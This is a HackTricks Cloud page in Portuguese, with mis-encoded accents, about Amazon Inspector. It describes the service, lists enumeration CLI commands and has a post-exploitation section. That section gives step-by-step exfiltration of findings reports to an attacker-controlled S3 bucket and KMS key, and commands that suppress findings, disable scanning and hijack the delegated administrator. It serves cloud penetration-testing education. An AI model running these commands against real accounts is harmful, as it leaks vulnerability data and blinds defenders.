# AWS - Inspector Enum

## AWS - Inspector Enum

{% hint style="success" %}
Aprenda e pratique Hacking AWS:<img src="../../../../.gitbook/assets/image (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../../.gitbook/assets/image (1) (1).png" alt="" data-size="line">\
Aprenda e pratique Hacking GCP: <img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Confira os [**planos de assinatura**](https://github.com/sponsors/carlospolop)!
* **Junte-se ao** üí¨ [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga**-nos no **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe truques de hacking enviando PRs para os** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) reposit√≥rios do github.

</details>
{% endhint %}

### Inspector

O Amazon Inspector √© um servi√ßo avan√ßado e automatizado de gerenciamento de vulnerabilidades projetado para melhorar a seguran√ßa do seu ambiente AWS. Este servi√ßo escaneia continuamente inst√¢ncias do Amazon EC2, imagens de cont√™iner no Amazon ECR, Amazon ECS e fun√ß√µes do AWS Lambda em busca de vulnerabilidades e exposi√ß√£o indesejada √† rede. Ao aproveitar um robusto banco de dados de intelig√™ncia de vulnerabilidades, o Amazon Inspector fornece descobertas detalhadas, incluindo n√≠veis de severidade e recomenda√ß√µes de remedia√ß√£o, ajudando as organiza√ß√µes a identificar e abordar proativamente os riscos de seguran√ßa. Essa abordagem abrangente garante uma postura de seguran√ßa fortalecida em v√°rios servi√ßos AWS, auxiliando na conformidade e gerenciamento de riscos.

### Elementos-chave

#### Descobertas

As descobertas no Amazon Inspector s√£o relat√≥rios detalhados sobre vulnerabilidades e exposi√ß√µes descobertas durante a varredura de inst√¢ncias EC2, reposit√≥rios ECR ou fun√ß√µes Lambda. Com base em seu estado, as descobertas s√£o categorizadas como:

* **Ativa**: A descoberta n√£o foi remediada.
* **Fechada**: A descoberta foi remediada.
* **Suprimida**: A descoberta foi marcada com este estado devido a uma ou mais **regras de supress√£o**.

As descobertas tamb√©m s√£o categorizadas nos seguintes tr√™s tipos:

* **Pacote**: Essas descobertas est√£o relacionadas a vulnerabilidades em pacotes de software instalados em seus recursos. Exemplos incluem bibliotecas desatualizadas ou depend√™ncias com problemas de seguran√ßa conhecidos.
* **C√≥digo**: Esta categoria inclui vulnerabilidades encontradas no c√≥digo de aplicativos que est√£o sendo executados em seus recursos AWS. Problemas comuns s√£o erros de codifica√ß√£o ou pr√°ticas inseguras que podem levar a viola√ß√µes de seguran√ßa.
* **Rede**: As descobertas de rede identificam exposi√ß√µes potenciais nas configura√ß√µes de rede que podem ser exploradas por atacantes. Isso inclui portas abertas, protocolos de rede inseguros e grupos de seguran√ßa mal configurados.

#### Filtros e Regras de Supress√£o

Filtros e regras de supress√£o no Amazon Inspector ajudam a gerenciar e priorizar descobertas. Os filtros permitem que voc√™ refine as descobertas com base em crit√©rios espec√≠ficos, como severidade ou tipo de recurso. As regras de supress√£o permitem que voc√™ suprimam certas descobertas que s√£o consideradas de baixo risco, j√° foram mitigadas ou por qualquer outro motivo importante, evitando que sobrecarreguem seus relat√≥rios de seguran√ßa e permitindo que voc√™ se concentre em quest√µes mais cr√≠ticas.

#### Software Bill of Materials (SBOM)

Um Software Bill of Materials (SBOM) no Amazon Inspector √© uma lista de invent√°rio aninhada export√°vel detalhando todos os componentes dentro de um pacote de software, incluindo bibliotecas e depend√™ncias. Os SBOMs ajudam a fornecer transpar√™ncia na cadeia de suprimentos de software, permitindo melhor gerenciamento de vulnerabilidades e conformidade. Eles s√£o cruciais para identificar e mitigar riscos associados a componentes de software de c√≥digo aberto e de terceiros.

### Recursos-chave

#### Exportar descobertas

O Amazon Inspector oferece a capacidade de exportar descobertas para Amazon S3 Buckets, Amazon EventBridge e AWS Security Hub, o que permite gerar relat√≥rios detalhados de vulnerabilidades e exposi√ß√µes identificadas para an√°lise ou compartilhamento em uma data e hora espec√≠ficas. Este recurso suporta v√°rios formatos de sa√≠da, como CSV e JSON, facilitando a integra√ß√£o com outras ferramentas e sistemas. A funcionalidade de exporta√ß√£o permite a personaliza√ß√£o dos dados inclu√≠dos nos relat√≥rios, permitindo que voc√™ filtre descobertas com base em crit√©rios espec√≠ficos, como severidade, tipo de recurso ou intervalo de datas, incluindo por padr√£o todas as suas descobertas na Regi√£o AWS atual com status Ativo.

Ao exportar descobertas, uma chave do Key Management Service (KMS) √© necess√°ria para criptografar os dados durante a exporta√ß√£o. As chaves KMS garantem que as descobertas exportadas estejam protegidas contra acesso n√£o autorizado, fornecendo uma camada extra de seguran√ßa para informa√ß√µes sens√≠veis de vulnerabilidades.

#### Varredura de inst√¢ncias Amazon EC2

O Amazon Inspector oferece robustas capacidades de varredura para inst√¢ncias Amazon EC2 para detectar vulnerabilidades e problemas de seguran√ßa. O Inspector comparou os metadados extra√≠dos da inst√¢ncia EC2 com regras de avisos de seguran√ßa para produzir vulnerabilidades de pacotes e problemas de acessibilidade de rede. Essas varreduras podem ser realizadas por meio de m√©todos **baseados em agente** ou **sem agente**, dependendo da configura√ß√£o das defini√ß√µes de **modo de varredura** da sua conta.

* **Baseado em Agente**: Utiliza o agente do AWS Systems Manager (SSM) para realizar varreduras aprofundadas. Este m√©todo permite a coleta e an√°lise abrangente de dados diretamente da inst√¢ncia.
* **Sem Agente**: Fornece uma alternativa leve que n√£o requer a instala√ß√£o de um agente na inst√¢ncia, criando um snapshot EBS de cada volume da inst√¢ncia EC2, procurando vulnerabilidades e, em seguida, excluindo-o; aproveitando a infraestrutura existente da AWS para varredura.

O modo de varredura determina qual m√©todo ser√° usado para realizar varreduras EC2:

* **Baseado em Agente**: Envolve a instala√ß√£o do agente SSM em inst√¢ncias EC2 para inspe√ß√£o profunda.
* **Varredura H√≠brida**: Combina m√©todos baseados em agente e sem agente para maximizar a cobertura e minimizar o impacto no desempenho. Nas inst√¢ncias EC2 onde o agente SSM est√° instalado, o Inspector realizar√° uma varredura baseada em agente, e para aquelas onde n√£o h√° agente SSM, a varredura realizada ser√° sem agente.

Outro recurso importante √© a **inspe√ß√£o profunda** para inst√¢ncias Linux EC2. Este recurso oferece uma an√°lise minuciosa do software e da configura√ß√£o das inst√¢ncias Linux EC2, fornecendo avalia√ß√µes detalhadas de vulnerabilidades, incluindo vulnerabilidades do sistema operacional, vulnerabilidades de aplicativos e configura√ß√µes incorretas, garantindo uma avalia√ß√£o de seguran√ßa abrangente. Isso √© alcan√ßado por meio da inspe√ß√£o de **caminhos personalizados** e todos os seus subdiret√≥rios. Por padr√£o, o Amazon Inspector ir√° escanear os seguintes, mas cada conta membro pode definir at√© 5 caminhos personalizados adicionais, e cada administrador delegado at√© 10:

* `/usr/lib`
* `/usr/lib64`
* `/usr/local/lib`
* `/usr/local/lib64`

#### Varredura de imagens de cont√™iner Amazon ECR

O Amazon Inspector fornece robustas capacidades de varredura para imagens de cont√™iner do Amazon Elastic Container Registry (ECR), garantindo que as vulnerabilidades de pacotes sejam detectadas e gerenciadas de forma eficiente.

* **Varredura B√°sica**: Esta √© uma varredura r√°pida e leve que identifica vulnerabilidades conhecidas de pacotes de SO em imagens de cont√™iner usando um conjunto padr√£o de regras do projeto de c√≥digo aberto Clair. Com esta configura√ß√£o de varredura, seus reposit√≥rios ser√£o escaneados ao serem enviados, ou realizando varreduras manuais.
* **Varredura Aprimorada**: Esta op√ß√£o adiciona o recurso de varredura cont√≠nua al√©m da varredura ao enviar. A varredura aprimorada aprofunda-se nas camadas de cada imagem de cont√™iner para identificar vulnerabilidades em pacotes de SO e em pacotes de linguagens de programa√ß√£o com maior precis√£o. Ela analisa tanto a imagem base quanto quaisquer camadas adicionais, fornecendo uma vis√£o abrangente de potenciais problemas de seguran√ßa.

#### Varredura de fun√ß√µes Amazon Lambda

O Amazon Inspector inclui capacidades abrangentes de varredura para fun√ß√µes AWS Lambda e suas camadas, garantindo a seguran√ßa e integridade de aplicativos sem servidor. O Inspector oferece dois tipos de varredura para fun√ß√µes Lambda:

* **Varredura padr√£o Lambda**: Este recurso padr√£o identifica vulnerabilidades de software nas depend√™ncias do pacote de aplicativo adicionadas √† sua fun√ß√£o Lambda e camadas. Por exemplo, se sua fun√ß√£o usar uma vers√£o de uma biblioteca como python-jwt com uma vulnerabilidade conhecida, ela gera uma descoberta.
* **Varredura de c√≥digo Lambda**: Analisa o c√≥digo de aplicativo personalizado em busca de problemas de seguran√ßa, detectando vulnerabilidades como falhas de inje√ß√£o, vazamentos de dados, criptografia fraca e falta de criptografia. Captura trechos de c√≥digo destacando vulnerabilidades detectadas, como credenciais codificadas. As descobertas incluem sugest√µes detalhadas de remedia√ß√£o e trechos de c√≥digo para corrigir os problemas.

#### **Varreduras do Center for Internet Security (CIS)**

O Amazon Inspector inclui varreduras CIS para avaliar os sistemas operacionais das inst√¢ncias Amazon EC2 em rela√ß√£o √†s recomenda√ß√µes de melhores pr√°ticas do Center for Internet Security (CIS). Essas varreduras garantem que as configura√ß√µes estejam em conformidade com as linhas de base de seguran√ßa padr√£o da ind√∫stria.

* **Configura√ß√£o**: As varreduras CIS avaliam se as configura√ß√µes do sistema atendem a recomenda√ß√µes espec√≠ficas do CIS Benchmark, com cada verifica√ß√£o vinculada a um ID de verifica√ß√£o e t√≠tulo do CIS.
* **Execu√ß√£o**: As varreduras s√£o realizadas ou agendadas com base em tags de inst√¢ncia e cronogramas definidos.
* **Resultados**: Os resultados p√≥s-varredura indicam quais verifica√ß√µes passaram, foram puladas ou falharam, fornecendo insights sobre a postura de seguran√ßa de cada inst√¢ncia.

### Enumera√ß√£o
```bash
# Administrator and member accounts #

## Retrieve information about the AWS Inpsector delegated administrator for your organization (ReadOnlyAccess policy is enough for this)
aws inspector2 get-delegated-admin-account

## List the members who are associated with the AWS Inspector administrator account (ReadOnlyAccess policy is enough for this)
aws inspector2 list-members [--only-associated | --no-only-associated]
## Retrieve information about a member account (ReadOnlyAccess policy is enough for this)
aws inspector2 get-member --account-id <value>
## Retrieve the status of AWS accounts within your environment (ReadOnlyAccess policy is enough for this)
aws inspector2 batch-get-account-status [--account-ids <value>]
## Retrieve the free trial status for the specified accounts (ReadOnlyAccess policy is enough for this)
aws inspector2 batch-get-free-trial-info --account-ids <value>
## Retrieve the EC2 Deep Inspection status for the member accounts (Requires to be the delegated administrator)
aws inspector2 batch-get-member-ec2-deep-inspection-status [--account-ids <value>]

## List an account's permissions associated with AWS Inspector
aws inspector2 list-account-permissions

# Findings #

## List a subset of information of the findings for your envionment (ReadOnlyAccess policy is enough for this)
aws inspector2 list-findings
## Retrieve vulnerability intelligence details for the specified findings
aws inspector2 batch-get-finding-details --finding-arns <value>
## List statistical and aggregated finding data (ReadOnlyAccess policy is enough for this)
aws inspector2 list-finding-aggregations --aggregation-type <FINDING_TYPE | PACKAGE | TITLE | REPOSITORY | AMI | AWS_EC2_INSTANCE | AWS_ECR_CONTAINER | IMAGE_LAYER\
| ACCOUNT AWS_LAMBDA_FUNCTION | LAMBDA_LAYER> [--account-ids <value>]
## Retrieve code snippet information about one or more specified code vulnerability findings
aws inspector2 batch-get-code-snippet --finding-arns <value>
## Retrieve the status for the specified findings report (ReadOnlyAccess policy is enough for this)
aws inspector2 get-findings-report-status --report-id <value>

# CIS #

## List CIS scan configurations (ReadOnlyAccess policy is enough for this)
aws inspector2 list-cis-scan-configurations
## List the completed CIS scans (ReadOnlyAccess policy is enough for this)
aws inspector2 list-cis-scans
## Retrieve a report from a completed CIS scan
aws inspector2 get-cis-scan-report --scan-arn <value> [--target-accounts <value>]
## Retrieve details about the specific CIS scan over the specified resource
aws inspector2 get-cis-scan-result-details --account-id <value> --scan-arn <value> --target-resource-id <value>
## List CIS scan results broken down by check
aws inspector2 list-cis-scan-results-aggregated-by-checks --scan-arn <value>
## List CIS scan results broken down by target resource
aws inspector2 list-cis-scan-results-aggregated-by-target-resource --scan-arn <value>

# Configuration #

## Describe AWS Inspector settings for AWS Organization (ReadOnlyAccess policy is enough for this)
aws inspector2 describe-organization-configuration
## Retrieve the configuration settings about EC2 scan and ECR re-scan
aws inspector2 get-configuration
## Retrieve EC2 Deep Inspection configuration associated with your account
aws inspector2 get-ec2-deep-inspection-configuration

# Miscellaneous #

## Retrieve the details of a Software Bill of Materials (SBOM) report
aws inspector2 get-sbom-export --report-id <value>

## Retrieve the coverage details for the specified vulnerabilities
aws inspector2 search-vulnerabilities --filter-criteria <vulnerabilityIds=id1,id2..>

## Retrieve the tags attached to the specified resource
aws inspector2 list-tags-for-resource --resource-arn <value>

## Retrieve the AWS KMS key used to encrypt the specified code snippets
aws inspector2 get-encryption-key --resource-type <AWS_EC2_INSTANCE | AWS_ECR_CONTAINER_IMAGE | AWS_ECR_REPOSITORY | AWS_LAMBDA_FUNCTION> --scan-type <NETWORK | PACKAGE | CODE>

## List the filters associated to your AWS account
aws inspector2 list-filters

## List the types of statistics AWS Inspector can generate (ReadOnlyAccess policy is enough for this)
aws inspector2 list-coverage
## Retrieve statistical data and about the resources AWS Inspector monitors (ReadOnlyAccess policy is enough for this)
aws inspector2 list-coverage-statistics

## List the aggregated usage total over the last 30 days
aws inspector2 list-usage-totals [--account-ids <value>]

### INSPECTOR CLASSIC ###

## Assessments info, there is a "describe" action for each one to get more info
aws inspector list-assessment-runs
aws inspector list-assessment-targets
aws inspector list-assessment-templates
aws inspector list-event-subscriptions

## Get findings
aws inspector list-findings

## Get exclusions
aws inspector list-exclusions --assessment-run-arn <arn>

## Rule packages
aws inspector list-rules-packages
```
### P√≥s Explora√ß√£o

{% hint style="success" %}
Do ponto de vista de um atacante, este servi√ßo pode ajudar o atacante a encontrar vulnerabilidades e exposi√ß√µes de rede que poderiam ajud√°-lo a comprometer outras inst√¢ncias/containers.

No entanto, um atacante tamb√©m poderia estar interessado em interromper este servi√ßo para que a v√≠tima n√£o possa ver vulnerabilidades (todas ou espec√≠ficas).
{% endhint %}

#### `inspector2:CreateFindingsReport`, `inspector2:CreateSBOMReport`

Um atacante poderia gerar relat√≥rios detalhados de vulnerabilidades ou faturas de materiais de software (SBOMs) e exfiltr√°-los do seu ambiente AWS. Essas informa√ß√µes poderiam ser exploradas para identificar fraquezas espec√≠ficas, software desatualizado ou depend√™ncias inseguras, possibilitando ataques direcionados.
```bash
# Findings report
aws inspector2 create-findings-report --report-format <CSV | JSON> --s3-destination <bucketName=string,keyPrefix=string,kmsKeyArn=string> [--filter-criteria <value>]
# SBOM report
aws inspector2 create-sbom-report --report-format <CYCLONEDX_1_4 | SPDX_2_3> --s3-destination <bucketName=string,keyPrefix=string,kmsKeyArn=string> [--resource-filter-criteria <value>]
```
O seguinte exemplo mostra como exfiltrar todas as descobertas Ativas do Amazon Inspector para um Bucket Amazon S3 controlado pelo atacante com uma chave Amazon KMS controlada pelo atacante:

1. **Crie um Bucket Amazon S3** e anexe uma pol√≠tica a ele para que seja acess√≠vel a partir do Amazon Inspector da v√≠tima:
```json
{
"Version": "2012-10-17",
"Statement": [
{
"Sid": "allow-inspector",
"Effect": "Allow",
"Principal": {
"Service": "inspector2.amazonaws.com"
},
"Action": [
"s3:PutObject",
"s3:PutObjectAcl",
"s3:AbortMultipartUpload"
],
"Resource": "arn:aws:s3:::inspector-findings/*",
"Condition": {
"StringEquals": {
"aws:SourceAccount": "<victim-account-id>"
},
"ArnLike": {
"aws:SourceArn": "arn:aws:inspector2:us-east-1:<victim-account-id>:report/*"
}
}
}
]
}
```
2. **Crie uma chave do Amazon KMS** e anexe uma pol√≠tica a ela para que possa ser utilizada pelo Amazon Inspector da v√≠tima:
```json
{
"Version": "2012-10-17",
"Id": "key-policy",
"Statement": [
{
...
},
{
"Sid": "Allow victim Amazon Inspector to use the key",
"Effect": "Allow",
"Principal": {
"Service": "inspector2.amazonaws.com"
},
"Action": [
"kms:Encrypt",
"kms:Decrypt",
"kms:ReEncrypt*",
"kms:GenerateDataKey*",
"kms:DescribeKey"
],
"Resource": "*",
"Condition": {
"StringEquals": {
"aws:SourceAccount": "<victim-account-id>"
}
}
}
]
}
```
3. Execute o comando para **criar o relat√≥rio de descobertas** exfiltrando-o:
```bash
aws --region us-east-1 inspector2 create-findings-report --report-format CSV --s3-destination bucketName=<attacker-bucket-name>,keyPrefix=exfiltration_,kmsKeyArn=arn:aws:kms:us-east-1:123456789012:key/1a2b3c4d-1a2b-1a2b-1a2b-1a2b3c4d5e6f
```
* **Impacto Potencial**: Gera√ß√£o e exfiltra√ß√£o de relat√≥rios detalhados de vulnerabilidades e software, obtendo insights sobre vulnerabilidades espec√≠ficas e fraquezas de seguran√ßa.

#### `inspector2:CancelFindingsReport`, `inspector2:CancelSbomExport`

Um atacante poderia cancelar a gera√ß√£o do relat√≥rio de descobertas especificado ou do relat√≥rio SBOM, impedindo que as equipes de seguran√ßa recebam informa√ß√µes oportunas sobre vulnerabilidades e a lista de materiais de software (SBOMs), atrasando a detec√ß√£o e remedia√ß√£o de problemas de seguran√ßa.
```bash
# Cancel findings report generation
aws inspector2 cancel-findings-report --report-id <value>
# Cancel SBOM report generatiom
aws inspector2 cancel-sbom-export --report-id <value>
```
* **Impacto Potencial**: Interrup√ß√£o da monitoriza√ß√£o de seguran√ßa e preven√ß√£o da detec√ß√£o e remedia√ß√£o oportunas de problemas de seguran√ßa.

#### `inspector2:CreateFilter`, `inspector2:UpdateFilter`, `inspector2:DeleteFilter`

Um atacante com essas permiss√µes seria capaz de manipular as regras de filtragem que determinam quais vulnerabilidades e problemas de seguran√ßa s√£o relatados ou suprimidos (se a **a√ß√£o** estiver definida como SUPPRESS, uma regra de supress√£o seria criada). Isso poderia ocultar vulnerabilidades cr√≠ticas dos administradores de seguran√ßa, facilitando a explora√ß√£o dessas fraquezas sem detec√ß√£o. Ao alterar ou remover filtros importantes, um atacante tamb√©m poderia criar ru√≠do ao inundar o sistema com descobertas irrelevantes, dificultando a monitoriza√ß√£o e resposta de seguran√ßa eficazes.
```bash
# Create
aws inspector2 create-filter --action <NONE | SUPPRESS> --filter-criteria <value> --name <value> [--reason <value>]
# Update
aws inspector2 update-filter --filter-arn <value> [--action <NONE | SUPPRESS>] [--filter-criteria <value>] [--reason <value>]
# Delete
aws inspector2 delete-filter --arn <value>
```
* **Impacto Potencial**: Oculta√ß√£o ou supress√£o de vulnerabilidades cr√≠ticas, ou inunda√ß√£o do sistema com descobertas irrelevantes.

#### `inspector2:DisableDelegatedAdminAccount`, (`inspector2:EnableDelegatedAdminAccount` & `organizations:ListDelegatedAdministrators` & `organizations:EnableAWSServiceAccess` & `iam:CreateServiceLinkedRole`)

Um atacante poderia interromper significativamente a estrutura de gerenciamento de seguran√ßa.

* Desabilitando a conta de administrador delegado, o atacante poderia impedir que a equipe de seguran√ßa acessasse e gerenciasse as configura√ß√µes e relat√≥rios do Amazon Inspector.
* Habilitar uma conta de administrador n√£o autorizada permitiria que um atacante controlasse as configura√ß√µes de seguran√ßa, potencialmente desabilitando varreduras ou modificando configura√ß√µes para ocultar atividades maliciosas.

{% hint style="warning" %}
√â necess√°rio que a conta n√£o autorizada esteja na mesma Organiza√ß√£o que a v√≠tima para se tornar o administrador delegado.

Para que a conta n√£o autorizada se torne o administrador delegado, tamb√©m √© necess√°rio que, ap√≥s o administrador delegado leg√≠timo ser desabilitado, e antes que a conta n√£o autorizada seja habilitada como o administrador delegado, o administrador leg√≠timo deve ser desregistrado como o administrador delegado da organiza√ß√£o. Isso pode ser feito com o seguinte comando (**`organizations:DeregisterDelegatedAdministrator`** permiss√£o necess√°ria): **`aws organizations deregister-delegated-administrator --account-id <legit-account-id> --service-principal [inspector2.amazonaws.com](http://inspector2.amazonaws.com/)`**
{% endhint %}
```bash
# Disable
aws inspector2 disable-delegated-admin-account --delegated-admin-account-id <value>
# Enable
aws inspector2 enable-delegated-admin-account --delegated-admin-account-id <value>
```
* **Impacto Potencial**: Interrup√ß√£o da gest√£o de seguran√ßa.

#### `inspector2:AssociateMember`, `inspector2:DisassociateMember`

Um atacante poderia manipular a associa√ß√£o de contas membros dentro de uma organiza√ß√£o do Amazon Inspector. Ao associar contas n√£o autorizadas ou desassociar contas leg√≠timas, um atacante poderia controlar quais contas est√£o inclu√≠das nas varreduras de seguran√ßa e relat√≥rios. Isso poderia levar √† exclus√£o de contas cr√≠ticas da monitoriza√ß√£o de seguran√ßa, permitindo que o atacante explorasse vulnerabilidades nessas contas sem detec√ß√£o.

{% hint style="warning" %}
Esta a√ß√£o deve ser realizada pelo administrador delegado.
{% endhint %}
```bash
# Associate
aws inspector2 associate-member --account-id <value>
# Disassociate
aws inspector2 disassociate-member --account-id <value>
```
* **Impacto Potencial**: Exclus√£o de contas-chave de varreduras de seguran√ßa, permitindo a explora√ß√£o n√£o detectada de vulnerabilidades.

#### `inspector2:Disable`, (`inspector2:Enable` & `iam:CreateServiceLinkedRole`)

Um atacante com a permiss√£o `inspector2:Disable` seria capaz de desativar varreduras de seguran√ßa em tipos de recursos espec√≠ficos (EC2, ECR, Lambda, c√≥digo Lambda) nas contas especificadas, deixando partes do ambiente AWS n√£o monitoradas e vulner√°veis a ataques. Al√©m disso, devido √†s permiss√µes **`inspector2:Enable`** & **`iam:CreateServiceLinkedRole`**, um atacante poderia ent√£o reativar varreduras seletivamente para evitar a detec√ß√£o de configura√ß√µes suspeitas.

{% hint style="warning" %}
Esta a√ß√£o deve ser realizada pelo administrador delegado.
{% endhint %}
```bash
# Disable
aws inspector2 disable --account-ids <value> [--resource-types <{EC2, ECR, LAMBDA, LAMBDA_CODE}>]
# Enable
aws inspector2 enable --resource-types <{EC2, ECR, LAMBDA, LAMBDA_CODE}> [--account-ids <value>]
```
* **Impacto Potencial**: Cria√ß√£o de pontos cegos na monitoriza√ß√£o de seguran√ßa.

#### `inspector2:UpdateOrganizationConfiguration`

Um atacante com esta permiss√£o seria capaz de atualizar as configura√ß√µes para a sua organiza√ß√£o Amazon Inspector, afetando os recursos de varredura padr√£o ativados para novas contas de membros.

{% hint style="warning" %}
Esta a√ß√£o deve ser realizada pelo administrador delegado.
{% endhint %}
```bash
aws inspector2 update-organization-configuration --auto-enable <ec2=true|false,ecr=true|false,lambda=true|false,lambdaCode=true|false>
```
* **Impacto Potencial**: Alterar pol√≠ticas e configura√ß√µes de varredura de seguran√ßa para a organiza√ß√£o.

#### `inspector2:TagResource`, `inspector2:UntagResource`

Um atacante poderia manipular tags em recursos do AWS Inspector, que s√£o cr√≠ticos para organizar, rastrear e automatizar avalia√ß√µes de seguran√ßa. Ao alterar ou remover tags, um atacante poderia potencialmente ocultar vulnerabilidades de varreduras de seguran√ßa, interromper relat√≥rios de conformidade e interferir em processos de remedia√ß√£o automatizados, levando a problemas de seguran√ßa n√£o verificados e comprometendo a integridade do sistema.
```bash
aws inspector2 tag-resource --resource-arn <value> --tags <value>
aws inspector2 untag-resource --resource-arn <value> --tag-keys <value>
```
* **Impacto Potencial**: Oculta√ß√£o de vulnerabilidades, interrup√ß√£o de relat√≥rios de conformidade, interrup√ß√£o da automa√ß√£o de seguran√ßa e interrup√ß√£o da aloca√ß√£o de custos.

## Refer√™ncias

* [https://docs.aws.amazon.com/inspector/latest/user/what-is-inspector.html](https://docs.aws.amazon.com/inspector/latest/user/what-is-inspector.html)
* [https://docs.aws.amazon.com/service-authorization/latest/reference/list\_amazoninspector2.html](https://docs.aws.amazon.com/service-authorization/latest/reference/list\_amazoninspector2.html)

{% hint style="success" %}
Aprenda e pratique Hacking AWS:<img src="../../../../.gitbook/assets/image (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../../.gitbook/assets/image (1) (1).png" alt="" data-size="line">\
Aprenda e pratique Hacking GCP: <img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Confira os [**planos de assinatura**](https://github.com/sponsors/carlospolop)!
* **Junte-se ao** üí¨ [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga**-nos no **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe truques de hacking enviando PRs para os reposit√≥rios do** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
{% endhint %}
